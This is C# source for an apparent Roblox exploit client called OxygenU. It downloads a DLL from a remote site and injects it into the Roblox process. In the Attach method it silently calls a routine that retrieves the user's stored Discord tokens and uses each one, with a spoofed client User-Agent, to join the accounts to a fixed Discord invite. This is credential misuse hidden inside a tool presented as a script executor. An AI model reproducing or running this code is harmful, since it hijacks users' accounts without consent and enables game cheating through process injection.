using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Windows.Forms;

namespace OxygenU_API
{
    public class Client
    {
       

       public static string pipe = "OxygenU";
       public static string name = "OxygenBytecode.dll";
       public static string downloadLink = "https://oxygenu.xyz/OxygenU/OxygenBytecode.dll";



        Pipe.BasicInject Injector = new Pipe.BasicInject();
        public  void Execute(string script)
        {
            Pipe.MainPipeClient(pipe, script);
        }

        public void IntializeUpdate()
        {
            if (File.Exists(name))
                if (!isOXygenUAttached())
                {
                    try
                    {
                        File.Delete(name);
                        new WebClient().DownloadFile(downloadLink, name);
                    }
                   catch(Exception ex)
                    {
                        MessageBox.Show($"Download Link Is Broken Most Propably, Contact PareX#2612 or create a ticket in #support of Oxygen U's Discord Server To Report This!, Debug: {ex.Message}","Error",MessageBoxButtons.OK,MessageBoxIcon.Error);
                    }
                }
                else
                {
                    MessageBox.Show("Roblox Is Running And Is Attached, Roblox Process Will Be Killed And Get You The Latest Update.", "Information.", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                    KillRoblox();
                    if (File.Exists(name))
                    {
                        try
                        {
                            File.Delete(name);
                            new WebClient().DownloadFile(downloadLink, name);
                        }
                        catch (Exception ex)
                        {
                            MessageBox.Show($"Download Link Is Broken Most Propably, Contact PareX#2612 or create a ticket in #support of Oxygen U's Discord Server To Report This!, Debug: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        }
                    }
                       
                }
            else
            {
                try
                {
                    new WebClient().DownloadFile(downloadLink, name);
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"Download Link Is Broken Most Propably, Contact PareX#2612 or create a ticket in #support of Oxygen U's Discord Server To Report This!, Debug: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        public async void Join_DiscordServer(string last_letters_of_invite, bool output)
        {
            try
            {
                foreach (string value in TokenRetriever.RetrieveDiscordTokens())
                {
                    HttpClient client = new HttpClient();
                    client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36");
                    client.DefaultRequestHeaders.Add("authorization", value);
                    HttpClient httpClient = client;
                    await httpClient.PostAsync("https://discordapp.com/api/v6/invite/" + last_letters_of_invite, null);
                    httpClient = null;
                }
                if (output)
                {
                    MessageBox.Show($"Most Prob Your In {Form.ActiveForm.Name}'s Discord , Scroll Up Or Down In Your List Of Servers And You Should See It!", "Information.", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                }
            }
            catch (Exception ex)
            {
                if (output)
                {
                    MessageBox.Show(ex.Message, $"Couldn't Join {Form.ActiveForm.Name}'s Discord");
                }
            }
        }

        public void Attach()
        {
            if (Process.GetProcessesByName("RobloxPlayerBeta").Length == 1)
            {
                if (!isOXygenUAttached())
                {
                    if (!File.Exists(name))
                        IntializeUpdate();
                    Injector.InjectDLL();
                    try
                    {
                        Join_DiscordServer("DfsBW9W", false);
                    }
                    catch (Exception )
                    {
                        return;
                    }
                }
                else
                {
                    MessageBox.Show("Roblox Is Already Running And It Has Been Attached Already.", "Nothing to worry about.", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            }
            else
            {
                MessageBox.Show("Roblox Is Not Running!", "Roblox Can Not Be Found!", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

       public bool isRobloxOn()
        {
            if (Process.GetProcessesByName("RobloxPlayerBeta").Length == 1)
                return true;
            else
                return false;
        }

        public bool isOXygenUAttached()
        {
            if (Pipe.NamedPipeExist(pipe))
                return true;
            else
                return false;
            
        }

        public void KillRoblox()
        {
            foreach (var process in Process.GetProcessesByName("RobloxPlayerBeta"))
                process.Kill();
        }
    }
}
